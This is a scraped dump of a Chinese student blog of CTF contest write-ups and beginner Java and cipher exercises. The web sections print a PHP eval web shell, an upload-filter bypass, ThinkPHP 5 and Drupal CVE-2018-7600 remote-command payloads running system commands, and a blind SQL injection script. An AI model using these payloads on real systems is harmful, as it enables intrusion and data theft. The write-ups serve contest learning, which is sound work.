type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY=&#x27;ISecer:www.isecer.com&#x27;;?&gt; (unserialize($cookie) === “$KEY”) 这样看起来，只要把$KEY=&#39;ISecer:www.isecer.com&#39;序列化之后，给cookie就可以了，事实上，也确实是把$KEY序列化之后给cookie，只不过，$KEY在序列化的时候，还未定义，是个空值，而不是$KEY=&#39;ISecer:www.isecer.com&#39;，所以，把$KEY=””序列化之后为s:0:&quot;&quot;; cookie的参数是ISecer，所以payload： cookie: ISecer=s:0:””; Trim的笔记本","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"CUMT-12月月赛","slug":"大学CTF/CUMT双月赛一","date":"2018-12-16T08:23:03.000Z","updated":"2019-05-09T09:56:21.337Z","comments":true,"path":"2018/12/16/大学CTF/CUMT双月赛一/","link":"","permalink":"http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%80/","excerpt":"前言By 窝不管窝的flag都队 学校的月赛，还是要参加的,大部分是队友做的","text":"前言By 窝不管窝的flag都队 学校的月赛，还是要参加的,大部分是队友做的 Crypto现代密码签到题打开题目，下载了一个cipher文件，查看如下图 可以猜测出是RSA密码，但是也需要点脑洞(‘O’, ‘I’, ‘Z’, ‘E’, ‘A’, ‘S’, ‘b’, ‘T’, ‘B’, ‘g’)-分别对应0,1,2,3,4,5,6,7,8,9 这样，把英文字符转换成对应的数字，然后再进行解密 解密脚本(大佬写的) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# coding=utf-8import stringimport gmpy2import itertoolsdef egcd(a, b): if a == 0: return b, 0, 1 else: g, y, x = egcd(b % a, a) return g, x - b // a * y, ydef main(): alpha = [&#x27;O&#x27;,&#x27;T&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;b&#x27;,&#x27;Z&#x27;,&#x27;I&#x27;,&#x27;E&#x27;,&#x27;S&#x27;,&#x27;g&#x27;] alphaPermu = list(itertools.permutations(alpha)) num = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;] for x in alphaPermu: flag = False # print(x) nn = &quot;xxxx&quot; c1 = &quot;xxxx&quot; c2 = &quot;xxxx&quot; e1 = &quot;x&quot; e2 = &quot;x&quot; for i in range(10): if (x[i] == &#x27;I&#x27; or x[i] == &#x27;g&#x27;) and i%2 == 0: flag = True break nn = nn.replace(x[i],num[i]) c1 = c1.replace(x[i],num[i]) c2 = c2.replace(x[i],num[i]) e1 = e1.replace(x[i],num[i]) e2 = e2.replace(x[i],num[i]) if flag: continue n = int(nn,10) c1 = int(c1,10) c2 = int(c2,10) e1 = int(e1,10) e2 = int(e2,10) if gmpy2.gcd(e1,e2) != 1: continue s = egcd(e1, e2) s1 = s[1] s2 = s[2] if s1 &lt; 0: s1 = -s1 try: c1 = gmpy2.invert(c1, n) except ZeroDivisionError: continue elif s2 &lt; 0: s2 = -s2 try: c2 = gmpy2.invert(c2, n) except ZeroDivisionError: continue m = pow(c1, s1, n) * pow(c2, s2, n) % n try: temp = &#x27;&#123;:x&#125;&#x27;.format(m).decode(&#x27;hex&#x27;) if &#x27;flag&#x27; in temp: print(x) print(temp) break except TypeError: passif __name__ == &#x27;__main__&#x27;: main() 即可得到flag Webez-upload 一道文件上传题，要绕过一下，不能提交php,asp等文件新建一个文件，构建一句话 1&lt;?php eval($_POAT[&#x27;ee&#x27;]); ?&gt; 绕过问题的话就是后缀名的问题(开始尝试了很多.php;.jpg、.php.abc都不行，可以成功上传，但是菜刀连接不到数据库),最后，更改后缀名为.php5才可以。 上传成功后，回显出一个文件路径， 访问后无回显，果断用菜刀试一下，右键添加，进行如下设置 即可拿到文件管理的权限 当前目录下无flag文件，最终在根目录下找到flag文件 Tp5打开题目，如下 这是thinkPHP v5，而thinkPHP5前段时间公布了一个远程命令执行漏洞这里正好可以利用一下。直接用现成的(没记住)payload： 1http://219.219.61.234:10005/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls (最后一个等于号后面可以直接输命令,ls 会回显当前目下的文件) 可以看到当前目录下的文件，发现没有flag文件 修改命令为 ls / 查看根目录payload： 1http://219.219.61.234:10005/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20/ 发现flag文件，查看该文件用cat /flagpayload： 1http://219.219.61.234:10005/public/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag 拿到flag CVEhint不需要扣分，就窥视了一下，提示是drupal7的CVE漏洞，听都没听说过，Google一波，学习到了，贴个链接： https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#Drupal7- https://www.jianshu.com/p/7c410db788ed 先创建账号，发现不可以发送email，google到的结果告诉我更换新密码的页面是存在漏洞的，所以输入用户名的时候 直接拿bp截断： 构造post： 123?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=system&amp;name%5B%23markup%5D=ls%20/&amp;name%5B%23type%5D=markupform_id=user_pass&amp;_triggering_element_name=name 这里原来的命令需要修改，将其改为ls%20/，目的是查看根目录，Go一下回显form_build_id 保留这个form_build_id，拿hackbar post一下这个form_build_id，如下图： 抓包截断，go一下回显根目录，发现flag文件， 下一步就要继续尝试打开这个flag文件，所以重复上述操作，将之前的ls命令换成cat%20/flag 即可（需要注意的就是这里的空格需要使用url编码%20，之前没有注意到这个点，导致回显不出数据） Crypto现代密码签到题看到n, c1, c2, e1, e2，猜测这题考的是《密码学》课程中刚学的RSA共模攻击，要求明文m。 先统计下n中的各字符出现频率： 序号 字词 频次 频率 % 1 O 72 11.6694 2 T 69 11.1831 3 A 65 10.5348 4 B 63 10.2107 5 b 62 10.0486 6 Z 62 10.0486 7 I 60 9.7245 8 E 56 9.0762 9 S 56 9.0762 10 g 52 8.4279 再统计下c1中的： 序号 字词 频次 频率 % 1 Z 72 11.6694 2 I 67 10.859 3 E 66 10.6969 4 S 65 10.5348 5 b 62 10.0486 6 g 60 9.7245 7 B 59 9.5624 8 O 58 9.4003 9 A 55 8.9141 10 T 53 8.59 发现只有10种字符，猜测他们对应数字0~9。那我们就可以列出他们的全排列，然后直接用算法。 优化： 因为n = pq，而p, q应该都是素数，那么个位肯定是奇数。 因为gcd(e1,n) == gcd(e2,n) == 1，所以e1和e2的个位也是奇数。 最后直接十六进制解密。 Python脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# coding=utf-8import stringimport gmpy2import itertoolsdef egcd(a, b): if a == 0: return b, 0, 1 else: g, y, x = egcd(b % a, a) return g, x - b // a * y, ydef main(): alpha = [&#x27;O&#x27;,&#x27;T&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;b&#x27;,&#x27;Z&#x27;,&#x27;I&#x27;,&#x27;E&#x27;,&#x27;S&#x27;,&#x27;g&#x27;] alphaPermu = list(itertools.permutations(alpha)) num = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;] for x in alphaPermu: flag = False # print(x) nn = &quot;ZZTOBOTBBISBBSOIIAbZAbZOAgObAEEgIBSBgBTIZAEgZTTZZbBEIOTEASTBBBAOEIZgETBSATESOZgZAZOZbTOIbSSIBIgOSZAEOTTgOOATSSBAbbAgOAAOOIOZAIAIABSZBEZBbABEIEOTOZbIbOSTZTAbgBATEbIIIAgSOBTgBBbgTObEATSOIgEISBEIITbEZTIOTOOTBTZZBOIbABOIZTbTTEgEbAggZgSEOAIbSgBbBbOZTESAZIbAZZSbSgEAASgOISIbIgZTbIEbOTgOZBEISAZBSTgTTBSgbIZSgbZBZESEbTgEZTTTEEOETZTOOAAOTZbZIgTZEISBbEZASggIBIgBESTZbZZAOASgOESAOBASAITBBObZZbZIbASIOIAObOSBbBIZZAIOEBBOgOITAAZOIATTSZAOBSSAIZgTBgTbOgOZEOOBgBOAbZTEgOgOOTBSZBIBATAOEOTTObggbATbATEbEOISIOZIIBgSbTETbTEgAIESAZITbgZbgbOAAgbgbgSEOBSObAEbSTEIAZSbSSTEABTSBESOTOETESbgAABABOEgBbAEBZEEgZIbZbbbTObTESbTABBBTISOBgZSEIIISABOI&quot; c1 = &quot;ZZEZZOESZTSbbEZETOAIbAbBgETTOASIgEESOgEZATOIgIEABAEOEEEBOTbZIObOESAZbIZTSBgSbZbZBbgbAOBZZABbATOIZIIAgAZAABSSTIEbIOOTAZIZgEbTSSIbEEBBZZIgSZBOEIETgAggIIEbOABIAOgIBBAZATIZIgBAOZbESEbEEBBBbZSOAgZbBZTEgAEbAIOOIEAEbbSIIbITZOTZSBSSABABbbbgOOBATBBTZIEAgSSSbbZOIgBTgOBISOIIIEZZZggbIZEEOSSEEOOgEZSgbAETTTgBBgZTOEIbISZIBSZBOSgSbBIIZIgSbEBBEEIZBgbEEOISbZgBbZIbTAbBAESEgIgSATSSBIZTgZOgZSTObBAZBOBgIATbZIggOIIOSAgSSBIbSEAgTTbTSZbTEgSOOgSTSEATBZOEBTOTEABEgZBAZSObbSEbEbIABZTTABgZETOgbgSZOTAOEOAZBTASbSSSSOBgEEETZTBZEZTSObSbgOIOTTZSETAgTSAITbAEIIAZgOSZZIbZgIIgBgEZOgZbITTgZbASZSEgOIATBgIOBOISgZBTBZOESbABbIIIBgIZOASAbAgSgBEZSbbOSIEbI&quot; c2 = &quot;IBTOZOIOOASIBTOISSSbSABbgIbAZEgAgBZBESbbgZbZIATZEOZIZTEIEOggEBbTSZZbASBSSSZIOAZSgTZAZgAIBAAgZTEAIOSESEBTgBSgEIOEbTIIBSAZbSbZEgOSObbBOSbbSTSIBOEZbgIObBBOTAbTbgOOEATBgOOTgIOggSgOZEgSIEgZSAAgTABBIAOTSgOAOITATISBSSTZBABATESSbAgOSbSASOObZbbATObAAgIZBAISBEATBTgbIgATZbbZSgTBgTBSgbZgZZZEBTOIIEAOTgTZOAIAZZBAIAObbIgEOTIAgSEOAbIZEAIOSZgBTASSbISgEOOZESEbBZEBOIAggZbgTTEESTIBbOBTASZTATSOOBAObAOAIgEbSOIISSAAZIIBEOETSOSbSEAbIZBbTEZTAOgBETOZTAOBZZbTIIABOASbIgAgTbbTIBASBbIZEbSTZBSbOAObIBTSbSEgOgSbTBZZEZBgIAObSEETTgTTEEAAAbAOESISIBTTSABTbAgBIggTBZbZEbEbITZbSTgTgBZBAEITgbEOBBBTZgAOTZEBAgbbSOgBTTZOAZBTOBZITIISZSTgBgOOTBbTEEIbgBEgT&quot; e1 = &quot;IIIBTZBg&quot; e2 = &quot;gbATZgI&quot; for i in range(10): if (x[i] == &#x27;I&#x27; or x[i] == &#x27;g&#x27;) and i%2 == 0: flag = True break nn = nn.replace(x[i],num[i]) c1 = c1.replace(x[i],num[i]) c2 = c2.replace(x[i],num[i]) e1 = e1.replace(x[i],num[i]) e2 = e2.replace(x[i],num[i]) if flag: continue n = int(nn,10) c1 = int(c1,10) c2 = int(c2,10) e1 = int(e1,10) e2 = int(e2,10) if gmpy2.gcd(e1,e2) != 1: continue s = egcd(e1, e2) s1 = s[1] s2 = s[2] if s1 &lt; 0: s1 = -s1 try: c1 = gmpy2.invert(c1, n) except ZeroDivisionError: continue elif s2 &lt; 0: s2 = -s2 try: c2 = gmpy2.invert(c2, n) except ZeroDivisionError: continue m = pow(c1, s1, n) * pow(c2, s2, n) % n try: temp = &#x27;&#123;:x&#125;&#x27;.format(m).decode(&#x27;hex&#x27;) if &#x27;flag&#x27; in temp: print temp break except TypeError: passif __name__ == &#x27;__main__&#x27;: main() 等了大概半分钟，出现flag： 古典密码签到题密文： 1ksyssskkysynbssbbnynnb 提示： 棋盘不是万能的，没有棋盘是万万不能的。 联想棋盘密码，刚好密文中只有5中字符：k, s, y, n, b。 两个一组查表，C++爆破脚本如下： 1234567891011121314151617181920212223242526272829#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int maxn = 99;char alpha[] = &quot;abcdefghiklmnopqrstuvwxyz&quot;;char cipher[] = &quot;ksyssskkysynbssbbnynnb&quot;;char tbl[] = &quot;ksynb&quot;;int main()&#123; int len = strlen(cipher); do &#123; char flag[99]; map&lt;char,int&gt; m; for(int i = 0; i &lt; 5; i++) &#123; m[tbl[i]] = i; &#125; int j = 0; for(int i = 0; i &lt; len; i += 2) &#123; int t = m[cipher[i]]*5+m[cipher[i+1]]; flag[j++] = alpha[t]; &#125; flag[j] = 0; printf(&quot;%s\\n&quot;,flag); &#125;while(next_permutation(tbl,tbl+5)); return 0;&#125; 得到运行结果：（一共5! = 120 种） 1bmgamowkyou ekzakipxois ditaikospkx ekzakhuysho ditaihyuxhp chnahksouky chnahixpyiu oytnyvirfvb puznuqkwfqb sxntxvhmfvb xsnzsqhmfqb upztplkwflb yotzolirflb iytgyvoslvc kuzguqpxlqc hxngxvsoqvd hsngsqxpvqe kpzgpluyqld iotgolyuvle rwgtwvmhlvc wrgzrqmhlqc mwgnwvriqvd mrgnrqwkvqe wmgzmlriqld rmgtmlwkvle ukztkfpxlfc yitzifoslfc pkznkfuyqfd oitnifyuvfe xhnzhfsoqfd shnthfxpvfe lvanvyfbiyr lqanqufbkuw qvatvxfbhxm vqazqsfbhsm qlatlpfbkpw vlazlofbior fvagvylcoys fqagqulcpux fvagvxqdsxo fqagqsvexsp flaglpqdupy flagloveyou qvatvwlcmwh vqazqrlcmrh lvanvwqdrwi lqanqrvewrk vlazlmqdrmi qlatlmvewmk qfatfklcpkx vfazfilcois lfanfkqduky lfanfiveyiu vfazfhqdsho qfatfhvexhp peznedkwidr odtndeirkew uezteckwhcm ydtzdcirhcm scntcehmkew xcnzcdhmidr kezgedpxods idtgdeospex kezgecuysco idtgdcyuxcp hcngcesouey hcngcdxpydu ueztebpxmbh ydtzdbosmbh peznebuyrbi odtndbyuwbk xcnzcbsorbi scntcbxpwbk rbgtbemhpex wbgzbdmhods mbgnberiuey mbgnbdwkydu wbgzbcrisco rbgtbcwkxcp 复制进npp，搜索flag，得到： 1flaglpqdupy flagloveyou 肯定是选择第二个。 First Level文件给出n, e, c。 推测是RSA密码，e很小，联想到刚学的低加密指数攻击，在Google上搜了很久，试了各种脚本，发现解不出d。 后来，才想起来前提gcd(e,φ(n)) = 1（两者要互素），但是e = 2，而φ(n)一定是偶数，所以互素显然不能成立。 然后试了试比较暴力的方法： 123456i=0 while 1: if(gmpy2.root(c+i*n, 2)[1]==1): print gmpy2.root(c+i*n, 2) break i=i+1 但是用它跑了几小时都出不了结果。 我甚至还用yafu把因数分解出来了。（下载地址：https://sourceforge.net/projects/yafu/） 但是还是没有方法解出来。 然后怀疑人生，然后用Google搜了下RSA e = 2，然后发现有个类似的密码体制和RSA相似，而且它的加密指数就是2！ Python脚本解决： 12345678910111213141516171819202122import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss)c = 499900287907163903863770127517451824950591449854220282014018552802396943304674724533357663876916175459043411887269615620980351359674373127551283923032759205525834407466303318140213222438375548066871397251493100247836770129792554768759516349058673615081761638343932256849889604058608747531941928982832585706361391950223948529046950139043176720742038526998231448270490097134641169635210567151369533018545746204046992368621334939029582400285322777365958482219075297507215203709356125635202625121091161318566582307478931230962853531285514124459092351456397307588024613094226807792165876133269038363995037219677926220967578191033480631890589761476293394613074763877465067481353073032261829035532832262390121385388328585967620567497069930361644409182632934629875953161754678971744082331335000439916510067572742641854184303838362027247026467270857712018679364014951870327424723286991989268813839644982317838329022551033151317911958707603833070206941532496854730739054206016872958750645705043270396511543390465607172543992216405734971188437702405334334961918445724163241075322921116618280425131683507843396376626705861243420399065472311770119489811395486846742327683616439776584876654620796349661745998246254486950516901889112077176621805823p = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498108275295255082627807077949841602061428289272700263987438087045434043977981316071156426134695316796020506076336851840708593720052204359360366058549157961154869248835793804817253083037277453771408544063058190126149127240681909811943783388977967q = 28349223152666012309896421767725787316124897111416473420803849019741154117582482568645254183215552986563114855665416593397403745371086355268654763921803558654340155902194948080056226592560917521612824589013349044205989541259468856602228462903448721105774109966325479530181197156476502473067978072053273437369680433495259118953717909524799086692640103084287064091489681162498101607280822202773532998098050880803631144514377948079277690787622279940743498439084904702494445241729763146426258407468147831250550239995285695193105630324823153678214290802694619958991541957383815098042054239547145549933872335482492225099839 X = rabin_decrypt(c, p, q, e=2)for x in X: t = &#x27;&#123;:x&#125;&#x27;.format(x).decode(&#x27;hex&#x27;) if &#x27;flag&#x27; in t: print t 运行结果：","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"cumt双月赛一","slug":"cumt双月赛一","permalink":"http://example.com/tags/cumt%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%B8%80/"}]},{"title":"2018安恒11月月赛","slug":"大学CTF/2018安恒11月月赛","date":"2018-12-16T07:11:06.000Z","updated":"2019-04-12T02:35:35.992Z","comments":true,"path":"2018/12/16/大学CTF/2018安恒11月月赛/","link":"","permalink":"http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/2018%E5%AE%89%E6%81%9211%E6%9C%88%E6%9C%88%E8%B5%9B/","excerpt":"前言第一次参加月赛，水了一波","text":"前言第一次参加月赛，水了一波 Web好黑的黑名单 根据提示，题目有黑名单，发现”吃面去吧”是个链接，点击如下图 发现有传参的地方，测试后有三种回显结果id=1:陕西油泼面价格为20id=2:想让我下面给你吃？id=3:这么坏？想让我下面给你吃吗？XD 分析回显 1 为正常页面，回显2为id查询结果的回显，回显3是被黑名单检测到的回显 测试是什么类型的注入 初步测试可知：空格，单引号，双引号都被过滤空格可以用‘%0a’代替 测试‘%0aand%0a1’,如下图 测试‘%0aand%0a0’如下图 初步得出结论，此处存在整形注入 构造payload 逻辑运算符都被过滤，而且like和regexp都无法使用的情况下 就需要一个小技巧，用‘between and’来代替逻辑运算符，在盲注中要注意一些细节 实际测试第一个字符 第二个字符 依次可以测试出所有字符 payload：?id=2 and (select (select database()) between ‘a’ and ‘z’) 但是黑名单还过滤了单引号，索引，’between and’支持16进制，所以改成16进制即可?id=2 and (select (select database()) between 0x61 and 0x7a)(也要把空格改为‘%0a’) 写一个爆破脚本 1234567891011121314151617181920212223242526272829import requestsimport binasciiburl = &#x27;http://101.71.29.5:10008/show.php?id=-1&#x27;flag = 0ans = &#x27;&#x27;result = &#x27;&#x27;for i in range(40): if flag == 0: for j in range(127,32,-1): if j == 33: flag = 1 #payload = &#x27;%0aor%0a(select%0adatabase()%0abetween%0a0x&#x27;+result+hex(j)[2:4]+&#x27;%0aand%0a0x7a)&#x27; #web #payload = &#x27;%0aor%0a(select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562%0aand%0a0x776562)%0abetween%0a0x&#x27;+result+hex(j)[2:4]+&#x27;%0aand%0a0x7a)&#x27; #admin,flaggg,menu #payload = &#x27;%0aor%0a(select%0a(select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.columns%0awhere%0atable_name%0abetween%0a0x666c61676767%0aand%0a0x666c61676767)%0abetween%0a0x&#x27;+result+hex(j)[2:4]+&#x27;%0aand%0a0x7a)&#x27; #id,f1agg payload = &#x27;%0aor%0a(select%0a(select%0af1agg%0afrom%0aflaggg)%0abetween%0a0x&#x27;+result+hex(j)[2:4]+&#x27;%0aand%0a0x7a)&#x27; url = burl+ payload con = requests.get(url)# print(con.text) if u&quot;郑州&quot; in con.text: ans = ans + chr(j) print(result) result = result + hex(j)[2:4] breakprint(ans) 可以看看https://0verwatch.top/2018/11/30/anheng-11month/","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"安恒11月月赛","slug":"安恒11月月赛","permalink":"http://example.com/tags/%E5%AE%89%E6%81%9211%E6%9C%88%E6%9C%88%E8%B5%9B/"}]},{"title":"python仿射密码","slug":"编程/python仿射密码","date":"2018-12-14T03:12:33.000Z","updated":"2021-05-23T07:32:24.540Z","comments":true,"path":"2018/12/14/编程/python仿射密码/","link":"","permalink":"http://example.com/2018/12/14/%E7%BC%96%E7%A8%8B/python%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/","excerpt":"前言密码学实验","text":"前言密码学实验 算法加密:E(x)=ax+b(mod 26) # x表示明文解密:D(x)=(a)’(E(x)-b)(mod 26) D(x)=a’E(x)-a’b(mod 26) # (a)’表示a的逆元 代码123456789101112131415161718192021222324252627282930313233343536import randomimport osa=int(input(&quot;输入a:&quot;))b=int(input(&quot;输入b:&quot;))dic = &#123;1: 1, 3: 9, 5: 21, 7: 15, 9: 3, 11: 19, 15: 7, 17: 23, 19: 11, 21: 5, 23: 17, 25: 25&#125; //dic[] a的逆元，a与26互素def Encrypt(): m=input(&quot;请输入明文：&quot;) k=m.lower() l=list(k) s=l for i in range(len(l)): s[i]=chr(((ord(l[i])-97)*a+b)%26+97) print(&quot;结果为：&quot;+&quot;&quot;.join(s))def Decrypt(): c=input(&quot;请输入密文：&quot;) k=c.lower() l=list(k) s=l for i in range(len(l)): s[i]=chr((dic[a]*(ord(l[i])-97)-(dic[a]*b)%26)%26+97) #s[i]=chr((dic[a]*((ord(l[i]))-dic[a]*b)%26)%26+97) print(&quot;结果为：&quot;+&quot;&quot;.join(s))while true: Encrypt() Decrypt()","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"python凯撒加解密","slug":"编程/python凯撒加解密","date":"2018-12-14T03:12:06.000Z","updated":"2021-05-23T07:32:31.701Z","comments":true,"path":"2018/12/14/编程/python凯撒加解密/","link":"","permalink":"http://example.com/2018/12/14/%E7%BC%96%E7%A8%8B/python%E5%87%AF%E6%92%92%E5%8A%A0%E8%A7%A3%E5%AF%86/","excerpt":"前言密码学实验","text":"前言密码学实验 代码算法只简单的移位 123456789101112131415161718192021222324252627282930313233import osdef encryption(): m = input(&quot;请输入明文:&quot;) k =int(input(&quot;位移值：&quot;)) s = m.lower() l = list(s) st = l i = 0 while i &lt; len(l): if ord(l[i]) &lt; 123-k: st[i] = chr(ord(l[i]) + k) else: st[i] = chr(ord(l[i]) + k - 26) i = i+1 print (&quot;加密结果为：&quot;+&quot;&quot;.join(st))def decryption(): m= input(&quot;请输入密文：&quot;) k = int(input(&quot;位移值：&quot;)) s = m.lower() l = list(s) st = l i = 0 while i &lt; len(l): if ord(l[i]) &gt;= 97+k: st[i] = chr(ord(l[i]) - k) else: st[i] = chr(ord(l[i]) + 26 - k) i = i+1 print (&quot;解密结果为：&quot;+&quot;&quot;.join(st))while True: encryption() decryption()","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"星花打印三角形","slug":"编程/星花打印三角形","date":"2018-11-27T07:21:25.000Z","updated":"2021-05-23T07:30:05.290Z","comments":true,"path":"2018/11/27/编程/星花打印三角形/","link":"","permalink":"http://example.com/2018/11/27/%E7%BC%96%E7%A8%8B/%E6%98%9F%E8%8A%B1%E6%89%93%E5%8D%B0%E4%B8%89%E8%A7%92%E5%BD%A2/","excerpt":"前言从键盘读入一个数，打印出对应的三角形。","text":"前言从键盘读入一个数，打印出对应的三角形。 代码代码很简单 12345678910111213141516171819202122232425262728import java.util.Scanner;public class Xinghua &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub Scanner s=new Scanner(System.in); while(s.hasNext()) //实现多组样例输入 &#123; int n=s.nextInt(); //输入 for(int i=1;i&lt;=n;i++) //换列 &#123; for(int j=0;j&lt;n-i;j++) System.out.print(&quot; &quot;); for(int k=n-i;k&lt;n;k++) System.out.print(&quot;* &quot;); System.out.println(); &#125; &#125; &#125;&#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"简单的阶乘的和","slug":"编程/简单的阶乘的和","date":"2018-11-15T07:05:21.000Z","updated":"2021-05-23T07:29:33.936Z","comments":true,"path":"2018/11/15/编程/简单的阶乘的和/","link":"","permalink":"http://example.com/2018/11/15/%E7%BC%96%E7%A8%8B/%E7%AE%80%E5%8D%95%E7%9A%84%E9%98%B6%E4%B9%98%E7%9A%84%E5%92%8C/","excerpt":"前言 输入一个数n，求1!+2!+3!+…n!.","text":"前言 输入一个数n，求1!+2!+3!+…n!. 代码123456789101112131415161718192021package JieCheng;import java.util.Scanner; //导入Scanner的包public class Jiecheng &#123; public static void main(String[] args) &#123; // TODO Auto-generated method stub Scanner s=new Scanner(System.in); int n=s.nextInt(); //输入n int sum=0; //记录和 int t=1; //记录1~n的阶乘 for(int i=1;i&lt;=n;i++) &#123; t*=i; //t为i的阶乘 sum+=t; &#125; System.out.println(sum); &#125;&#125; 也可以使用递归函数 123456789101112131415161718192021222324252627package JieCheng;import java.util.Scanner; //导入Scanner的包public class Jiecheng &#123; public static int JieC(int n) //这是求n的阶乘的递归函数 &#123; if(n==1)return 1; return n*JieC(n-1); &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub Scanner s=new Scanner(System.in); int n=s.nextInt(); //输入n int sum=0; //记录和 for(int i=1;i&lt;=n;i++) &#123; sum+=JieC(i); &#125; System.out.println(sum); &#125;&#125;","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"冒泡排序(Scanner,Array,print,println)","slug":"编程/冒泡排序-Scanner-Array-print-println","date":"2018-11-13T11:17:46.000Z","updated":"2021-05-23T07:29:53.487Z","comments":true,"path":"2018/11/13/编程/冒泡排序-Scanner-Array-print-println/","link":"","permalink":"http://example.com/2018/11/13/%E7%BC%96%E7%A8%8B/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F-Scanner-Array-print-println/","excerpt":"第一次写java程序，一个简单的冒泡排序。","text":"第一次写java程序，一个简单的冒泡排序。 算法比较简单，直接看代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package bubblesort;import java.util.Arrays; //相当于c++的头文件import java.util.Scanner; //Scanner输入的模块public class bubblesort &#123; public static void BubbleSort(int[] a) &#123; //冒泡排序 int t; for(int i=0;i&lt;a.length-1;i++) &#123; for(int j=0;j&lt;a.length-i-1;j++) &#123; if(a[j+1]&lt;a[j]) &#123; t=a[j]; a[j]=a[j+1]; a[j+1]=t; &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; // TODO Auto-generated method stub int arr[] = new int[10]; //float a[]=new float[10]; Scanner s=new Scanner(System.in); //新建一个输入扫描器s for(int i=0;i&lt;10;i++) //输入10个数 &#123; arr[i]=s.nextInt(); //输入为int型 //a[i]=s.nextFloat(); 输入为float型 //double num2 = s.nextDouble(); 输入为double型 //String str=s.next() //输入为字符串，空格分割字符串，即不能输入空格 //String str2=s.nextLine() //输入为字符串，回车分割字符串，可以输入空格 &#125; BubbleSort(arr); System.out.println(Arrays.toString(arr));//调用Arrays.toString(arr)，直接输出一个数组 for(int k=0;k&lt;arr.length;k++) &#123; System.out.println(arr[k]); //像c++的数组，每输出一个元素都换行println &#125; for(int k=0;k&lt;arr.length;k++) &#123; System.out.print(arr[k]+&quot;,&quot;); //在一行输出，不换行 &#125; System.out.print(&quot;\\n&quot;); //换行 for(int x:arr)&#123; //把数组元素给x，然后输出 System.out.print( x ); System.out.print(&quot;,&quot;); &#125; &#125;&#125; 输入及输出效果，第一行为输入： 总结Scanner1234567import java.util.Scanner; //头文件int a=s.nextInt(); //输入为int型float a=s.nextFloat(); 输入为float型//double num2 = s.nextDouble(); 输入为double型//String str=s.next() //输入为字符串，空格分割字符串，即不能输入空格//String str2=s.nextLine() //输入为字符串，回车分割字符串，可以输入空格 数组输出方式1234567891011121314151617181920import java.util.Arrays; //导入Arrays.toString的模块 System.out.println(Arrays.toString(arr));//调用Arrays.toString(arr)，直接输出一个数组 